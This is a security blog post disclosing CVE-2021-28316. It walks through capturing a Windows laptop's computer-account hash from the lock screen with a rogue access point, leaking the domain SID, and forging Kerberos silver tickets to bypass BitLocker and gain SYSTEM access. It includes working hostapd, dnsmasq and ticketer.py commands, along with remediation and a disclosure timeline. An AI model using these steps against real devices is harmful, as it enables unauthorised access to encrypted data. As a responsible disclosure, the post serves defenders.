<!DOCTYPE html>
<html lang="en-us">
  <head>
    <meta charset="utf-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
    
    <title>Airstrike Attack - FDE bypass and EoP on domain joined Windows workstations (CVE 2021-28316) - breakfix.co</title>
    
    <meta name="description" content="There should have been a video here but your browser does not seem to support it.  Summary By default, domain joined Windows workstations allow access to the network selection UI from the lock screen.
An attacker with physical access to a locked device with WiFI capabilities (such as a laptop or a workstation) can abuse this functionality to force the laptop to authenticate against a rogue access point and capture a MSCHAPV2 challenge response hash for the domain computer account.">
    <meta name="author" content="">
    
    <link href="https://breakfix.co/an-old-hope.min.css" rel="stylesheet">
    <link href="https://breakfix.co/style.css" rel="stylesheet">
    <link href="https://breakfix.co/custom.css" rel="stylesheet">
    
    <link rel="apple-touch-icon" href="https://breakfix.co/apple-touch-icon.png">
    <link rel="icon" href="https://breakfix.co/favicon.ico">
    <meta name="generator" content="Hugo 0.80.0" />
    
    
    
<script async src="https://www.googletagmanager.com/gtag/js?id=G-66QLTNLGVX"></script>
<script>
  window.dataLayer = window.dataLayer || [];
  function gtag(){dataLayer.push(arguments);}
  gtag('js', new Date());

  gtag('config', 'G-66QLTNLGVX');
</script>


    <script>
      function setTheme() {
          document.body.classList.add('dark');
          
          return;
        }
    </script>
  </head>
  <body class="single">
    <script>
      setTheme();
    </script>
    <header class="header">
      <nav class="nav">
        <p class="logo"><a href="https://breakfix.co/">breakfix.co</a></p>
        <ul class="menu">
          <li>
            <a href="/about/">About</a>
          </li>
        </ul>
      </nav>
    </header>
    <main class="main">


<article class="post-single">
  <header class="post-header">
    <h1 class="post-title">Airstrike Attack - FDE bypass and EoP on domain joined Windows workstations (CVE 2021-28316)</h1>
    <div class="post-meta">April 14, 2021</div>
  </header>
  <div class="post-content"><video width="640" height="360" class="video-shortcode" preload="auto" controls>
    <source src="/airstrike/airstrike.mp4" type="video/mp4">
    There should have been a video here but your browser does not seem
    to support it.
</video>

<h2 id="summary">Summary</h2>
<p>By default, domain joined Windows workstations allow access to the network selection UI from the lock screen.</p>
<p>An attacker with physical access to a locked device with WiFI capabilities (such as a laptop or a workstation) can abuse this functionality to force the laptop to authenticate against a rogue access point and capture a MSCHAPV2 challenge response hash for the domain computer account.</p>
<p>This challenge response hash can then be submitted to <a href="https://crack.sh/wpa-enterprise/">crack.sh</a> to recover the NTLM hash of the computer account in less than 24 hours.</p>
<p>Once recovered, this NTLM hash combined with the domain SID can be used to forge Kerberos silver tickets to impersonate a privileged user and compromise the host. An example of this is to create a silver ticket for the CIFS service of the laptop in order to authenticate over SMB as the SYSTEM user and gain unrestricted access to the hard disk.</p>
<p>As the attack can be performed from a locked device, it can be utilised to bypass BitLocker full disk encryption and gain access to the devices file system.</p>
<p>In addition, as silver tickets can be forged for privileged users, this attack can also be leveraged to elevate privileges to that of local administrator on the device.</p>
<h2 id="affected-versions">Affected Versions</h2>
<p>The vulnerability was confirmed to be present on domain joined Windows 10 hosts. Older versions of Windows may also be affected but have not been tested.</p>
<h2 id="background">Background</h2>
<p>Those familiar with enterprise wireless networks will likely be familiar with the Protected Extensible Authentication Protocol (PEAP).</p>
<p>PEAP is a tunneled authentication protocol, which means that an SSL tunnel is first established with the RADIUS server (known as Phase 1) in order to protect the credential material sent during authentication (Phase 2).</p>
<p>One of the most common inner authentication methods used in Windows environments is MSCHAPv2. The MSCHAPv2 protocol has been around for a long time and has some severe cryptographic flaws, as demonstrated by Moxie Marlinspike and David Hulton in one of my all time favorite DEF CON talks <a href="https://www.youtube.com/watch?v=gkPvZDcrLFk">here</a>.</p>
<p>The culmination of this research is the <a href="https://crack.sh/wpa-enterprise/">crack.sh</a> service, which guarantees the recovery of an NTLM hash for any given MSCHAPv2 challenge response hash (regardless of password complexity).</p>
<p>In Windows environments, when a domain user authenticates to a wireless access point using PEAP with MSCHAPv2 the resulting challenge response hash is derived from the NTLM hash of the domain user&rsquo;s password.</p>
<p>In addition to domain user authentication, Windows also provides the option to use Machine / Computer Authentication. This is used to allow the device to authenticate to the wireless network prior to the domain user logging in.</p>
<p>Computer authentication is required to solve the &ldquo;chicken and the egg&rdquo; situation that arises when a device first needs to authenticate to the network before it is able to reach Active Directory and authenticate the domain user. In order to create a seamless experience for the user, this authentication takes place from the lock screen prior to the user logging into the device.</p>
<p>Computer authentication can use either client certificates or MSCHAPV2 for it&rsquo;s inner authentication mechanism. In the case of client certificates, a certificate issued for the domain computer account is used to authenticate. But what happens if computer authentication is used with PEAP and MSCHAPv2 ? In this case, the NTLM hash of the domain computer account is used for authentication.</p>
<p>Computer account passwords are complex, long and randomly generated. There is no way that we will ever be able to recover the plain text password for this account, so why does this matter ? Well, we can&rsquo;t recover the plain text password but thanks to <a href="https://crack.sh/wpa-enterprise/">crack.sh</a> we can recover the NTLM hash.</p>
<p>Computer account NTLM hashes have a special significance in the context of Windows domain environments as they relate to Kerberos silver tickets. Kerberos service tickets for services hosted by the computer (for example the CIFS service) are signed and encrypted using the computer account&rsquo;s NTLM hash.</p>
<p>In order to forge service tickets we need the following information:</p>
<ul>
<li>NTLM hash of the computer account</li>
<li>Service Name we want to gain access to</li>
<li>The Domain SID</li>
</ul>
<p>Once we have recovered the computer account NTLM hash from <a href="https://crack.sh/wpa-enterprise/">crack.sh</a>, all we require is the domain SID and we can forge our own tickets. The domain SID is not secret information and can be retrieved by any regular domain user.</p>
<h2 id="privilege-escalation-from-domain-user-to-local-administrator">Privilege escalation from domain user to local administrator</h2>
<p>To weaponize this, we first need to create a rogue access point that supports PEAP with MSCHAPV2 set as the inner authentication method. There are many tools to accomplish this, here we are using <a href="https://github.com/sensepost/hostapd-mana">hostapd-mana</a>.</p>
<p><strong>Note</strong> In order to allow later versions of Windows 10 to connect to the access point, the RADIUS server certificate needs to be signed using a trusted CA. Failure to do this will result in a vague &ldquo;failed to connect&rdquo; error on the Windows 10 supplicant.</p>
<p>Here we are using LetsEncrypt to achieve this with the below commands (note the server name on the certificate is irrelevant - it just needs to be signed by a trusted authority).</p>
<pre><code># Generate LetsEncrypt certificates
sudo snap install --classic certbot
sudo certbot certonly --standalone -d radius.breakfix.co
</code></pre>
<p>Once the certificates are generated, we rename them to make more sense with our hostapd config and generate the DH params.</p>
<pre><code># Rename certificates to work with hostapd
cp /etc/letsencrypt/live/radius.breakfix.co/fullchain.pem ca.pem
cp /etc/letsencrypt/live/radius.breakfix.co/privkey.pem server.key
cp /etc/letsencrypt/live/radius.breakfix.co/cert.pem server.pem

# Generate DH params
openssl dhparam 2048 &gt; dhparam.pem
</code></pre>
<p>Then we create a &ldquo;hostapd.conf&rdquo; file with the contents below</p>
<pre><code>interface=$WIRELESS_INTERFACE_HERE
ssid=Airstrike
hw_mode=g
channel=6 

wpa=3
wpa_key_mgmt=WPA-EAP
wpa_pairwise=TKIP CCMP
auth_algs=3

ieee8021x=1
eapol_key_index_workaround=0
eap_server=1
eap_user_file=hostapd.eap_user
ca_cert=ca.pem
server_cert=server.pem
private_key=server.key
private_key_passwd=
dh_file=dhparam.pem

mana_wpe=1
</code></pre>
<p>And &ldquo;hostapd.eap_user&rdquo; file with the contents below</p>
<pre><code>*		PEAP,TTLS,TLS,MD5,GTC
&quot;t&quot;     	GTC,TTLS-MSCHAPV2,MSCHAPV2,MD5,TTLS-PAP,TTLS-CHAP,TTLS-MSCHAP  &quot;1234test&quot;  [2]
</code></pre>
<p>Once this has been done hostpad-mana can be run with the command <code>./hostapd hostpad.conf</code>. At this point the attacker can force the laptop to connect to the access point from the lock screen (ignoring the certificate error) resulting in a capture of the MSCHAPV2 challenge response hash for the computer account as seen below.</p>
<p><img src="/airstrike/1_lockscreen.png" alt="lockscreen"></p>
<p><img src="/airstrike/2_hostapd.png" alt="hostapd"></p>
<p>The wireless authentication will fail at this stage as MSCHAPv2 requires that the access point also has knowledge of the password, but the challenge response hash will be captured.</p>
<h3 id="recovering-the-ntlm-hash">Recovering the NTLM hash</h3>
<p>This captured MSCHAPv2 challenge response hash can then be converted to Cloud Crack format using the tool <a href="https://github.com/moxie0/chapcrack">chapcrack</a> and submitted to <a href="https://crack.sh/wpa-enterprise/">crack.sh</a> for cracking.</p>
<p><img src="/airstrike/3_chapcrack.png" alt="chapcrack"></p>
<p>For POC purposes, in our lab, we use the tool <code>secretsdump.py</code> from <a href="https://github.com/SecureAuthCorp/impacket">Impacket</a> to validate that the first 4 bytes of K3 outputted by chapcrack match the last 4 bytes of the NTLM hash for the computer account.</p>
<p><img src="/airstrike/4_secrets_dump.png" alt="secrets_dump"></p>
<p>As an authenticated domain user, we can fetch the domain SID in many different ways. The easiest is to simply run <code>whoami /all</code>.</p>
<p><img src="/airstrike/5_whoami.png" alt="whoami"></p>
<p>We now have all the information required to forge a sliver ticket for the CIFS service on the device. As we can specify the user and group SIDs contained within the service ticket we can use this to access the CIFS service as an administrative user.</p>
<p>We can do this using the tool <code>ticketer.py</code> from <a href="https://github.com/SecureAuthCorp/impacket">Impacket</a> and the below commands.</p>
<pre><code>ticketer.py -nthash c86afa9bd3c7afa9ff31da6af182ddbe -domain-sid S-1-5-21-553012155-822088108-1873906631 -domain INITECH.local -spn cifs/DESKTOP-J5KI5KA.initech.local administrator
export KRB5CCNAME=administrator.ccache
</code></pre>
<p><img src="/airstrike/6_ticketer.png" alt="ticketer"></p>
<p>Using smbclient, we now have access to the entire file system of the laptop.</p>
<p><img src="/airstrike/7_smbclient.png" alt="smbclient"></p>
<p>Tools such as <code>smbexec.py</code> from <a href="https://github.com/SecureAuthCorp/impacket">Impacket</a> provide an easy way to gain command execution on the host under the security context of the SYSTEM user.</p>
<p><img src="/airstrike/8_smbexec_whoami.png" alt="smbexec"></p>
<p>After later discovering that it was possible to elicit the challenge response hash from the lock screen, this opened up some more interesting attack scenarios, such as targeting locked laptops with Full Disk Encryption (FDE) enabled.</p>
<p>In order to exploit this, however, there was one important piece of the puzzle missing, the domain SID. We needed a way to recover it without first being logged into the machine.</p>
<h2 id="the-missing-piece-of-the-puzzle">The missing piece of the puzzle</h2>
<p>Many months after discovering this attack, we were approached by a client to perform a test on one of their SOE laptops. One specific concern they had was what damage could be done if an attacker was able to get their hands on a locked laptop protected with BitLocker full disk encryption.</p>
<p>After this specific scenario was put forth, myself and my colleague <a href="https://twitter.com/danyaldrew">@DanyalDrew</a> revisited the idea and set out to see if we could discover a way to leak the domain SID without being logged into the machine.</p>
<p>When a domain joined computer first accesses a network, a number of CLDAP searches are performed in order to identify which services are available on the Domain Controller. These messages are referred to as the <a href="https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-adts/895a7744-aff3-4f64-bcfa-f8c05915d2e9">LDAP ping</a>.</p>
<p>This sounded promising, as the CLDAP query used during this discovery process contains the following information:</p>
<ul>
<li>DnsDomain</li>
<li>Host</li>
<li>DnsHostName</li>
<li>User</li>
<li>DomainSid</li>
<li>DomainGuid</li>
</ul>
<p>Our initial tests involved running Wireshark captures and observing the LDAP DNS requests made by the wireless client.</p>
<p><img src="/airstrike/9_domain_sid_wireshark.png" alt="domain_sid"></p>
<p>After adding these <code>srv-host</code> DNS entries into our dnsmasq config and reconnecting the client, we found what we were looking for.</p>
<p><img src="/airstrike/10_domain_sid_wireshark_2.png" alt="domain_sid_2"></p>
<p>With that, we now had everything we needed to attempt to break into the locked laptop.</p>
<h2 id="gaining-access-to-a-locked-machine-with-full-disk-encryption-enabled">Gaining access to a locked machine with full disk encryption enabled</h2>
<p>The same rouge AP configuration can be used to capture the challenge response hash from the lock screen of the target device and submit to crack.sh.</p>
<p>To leak the domain SID, we need to join the laptop to an attacker controlled network where we will respond to all DNS SRV requests made by the laptop with the attackers IP address.</p>
<p>This will allow us to capture the &ldquo;LDAP ping&rdquo; packets that contain the domain SID and domain name. Once again, we will run a rogue access point and force the client to connect from the lock screen. However, instead of configuring the access point to support PEAP authentication, this time we will create a WPA2-PSK network using the below <code>hostapd.conf</code> and <code>hostapd-psk</code> file.</p>
<pre><code>interface=$WIRELESS_INTERFACE_HERE
ssid=Airstrike_WPA
channel=1
auth_algs=1
wpa=3
wpa_psk_file=./hostapd-psk
wpa_key_mgmt=WPA-PSK 
wpa_pairwise=CCMP TKIP
rsn_pairwise=CCMP
</code></pre>
<p>And create a file <code>hostapd-psk</code> to configure the password for the network.
<code>00:00:00:00:00:00 airstrike</code></p>
<p>As we want the laptop to connect to our network, we will also need to run a DHCP and DNS server using <code>dnsmasq</code> with the below <code>dnsmasq.conf</code> file.</p>
<pre><code>interface=$WIRELESS_INTERFACE_HERE
dhcp-range=10.0.0.10,10.0.0.100,8h
dhcp-option=3,10.0.0.1
dhcp-option=6,10.0.0.1
server=8.8.8.8
log-queries
log-dhcp
</code></pre>
<p>Now we can assign an IP address to our wireless adapter and start the DNS / DHCP server.</p>
<pre><code>ifconfig $WIRELESS_INTERFACE 10.0.0.1/24 up
dnsmasq -d -C dnsmasq.conf
</code></pre>
<p>In order to capture traffic from the laptop we will also enable tcpdump on the wireless interface.</p>
<pre><code>tcpdump -i $WIRELESS_INTERFACE -s 65535 -w $OUT_FILE.pcap
</code></pre>
<p>Once this is running, we can connect to the wireless network from the lock screen and should see the laptop receive an IP from our DHCP server.</p>
<p>When the laptop first connects, we will see a number of SRV DNS requests that will not be responded to. We will take note of each of these and modify our <code>dnsmasq.conf</code> file to respond to them with the IP address of our wireless access point.</p>
<pre><code>interface=$WIRELESS_INTERFACE_HERE
dhcp-range=10.0.0.10,10.0.0.100,8h
dhcp-option=3,10.0.0.1
dhcp-option=6,10.0.0.1
server=8.8.8.8
log-queries
log-dhcp

srv-host=_ldap._tcp.Default-First-Site-Name._sites.dc._msdcs.INITECH.local,10.0.0.1,389
srv-host=_ldap._tcp.dc._msdcs.INITECH.local,10.0.0.1,389
srv-host=_ldap._tcp.a3fcc77a-710d-4956-af07-bfa9187b91e9.domains._msdcs.INITECH.local,10.0.0.1,389
srv-host=_ldap._tcp.INITECH.local,10.0.0.1,389
</code></pre>
<p>We can now disconnect and reconnect the laptop from our access point and examine the contents of our new pcap file. If we filter our packets for the <code>CLDAP</code> protocol we can see the laptop attempting an <code>LDAP ping</code> against our attacker IP. The contents of the LDAP ping messages contain the Active Directory domain name, host name of the laptop and domain SID.</p>
<p>We can once again use the tool <code>ticketer.py</code> to create a silver ticket for the CIFS service and authenticate using <code>smbclient</code> to gain unrestricted access to the device&rsquo;s file system.</p>
<blockquote>
<p><strong>Note:</strong> There may be instances in which the default RID 500 account does not have local administrator rights on the domain joined host. In this case, a brute force approach can be taken by incrementing the RID contained in the silver ticket until a valid account is found.</p>
</blockquote>
<h2 id="remediation">Remediation</h2>
<p>This issue was disclosed to the Microsoft Security Response Center and has been addressed in the latest <a href="https://msrc.microsoft.com/update-guide/en-US/vulnerability/CVE-2021-28316">April 2021 security update</a>.</p>
<p>As a further hardening measure, the ability to access the network selection UI from the lock screen can be disabled via the below Group Policy setting.</p>
<pre><code>Computer Configuration | Administrative Templates | System | Logon --&gt; Do not display network selection UI
</code></pre>
<p>This setting can also be configured via the registry by enabling the <code>DontDisplayNetworkSelectionUI</code> flag.</p>
<pre><code>[HKEY_LOCAL_MACHINE\SOFTWARE\Policies\Microsoft\Windows\System]
&quot;DontDisplayNetworkSelectionUI&quot;=dword:00000001
</code></pre>
<h2 id="acknowledgements">Acknowledgements</h2>
<p>Thanks to Elad Shamir <a href="https://twitter.com/elad_shamir">@elad_shamir</a> for his guidance and encouragement to continue research into the issue.</p>
<p>Also thanks to Danyal Drew <a href="https://twitter.com/danyaldrew">@DanyalDrew</a> for helping to solve the domain SID problem allowing for FDE bypass.</p>
<p>Further thanks to Moxie Marlinspike and David Hulton for the inspiring talk and the <a href="https://crack.sh/wpa-enterprise/">crack.sh</a> service which makes this exploit possible.</p>
<h2 id="disclosure-timeline">Disclosure Timeline</h2>
<ul>
<li>11/12/2020 - Issue reported to MSRC with 90 day disclosure deadline</li>
<li>9/01/2021 - Update from MSRC that they are investigating the issue</li>
<li>29/01/2021 - MSRC ask for more time to explore potential fixes</li>
<li>11/03/2021 - MSRC confirm the behavior reported</li>
<li>12/04/2021 - MSRC confirm a patch will be released as part of the April security update</li>
<li>14/04/2021 - Microsoft release patch in April security update (CVE 2021-28316 assigned)</li>
</ul>
<p><strong>This article was also posted on <a href="https://shenaniganslabs.io/2021/04/13/Airstrike.html">shenaniganslabs.io</a></strong></p>
</div>
  
</article></main>
<footer class="footer">
  <span>&copy; 2024 <a href="https://breakfix.co/">breakfix.co</a></span>
  <span>&middot;</span>
  <span>Powered by <a href="https://gohugo.io/" rel="noopener" target="_blank">Hugo️️</a>️</span>
  <span>&middot;</span>
  <span>Theme️ <a href="https://github.com/nanxiaobei/hugo-paper" rel="noopener" target="_blank">Paper</a></span>
</footer>
<script src="https://breakfix.co/highlight.min.js"></script>
<script>
  hljs.initHighlightingOnLoad();
</script>
</body>
</html>

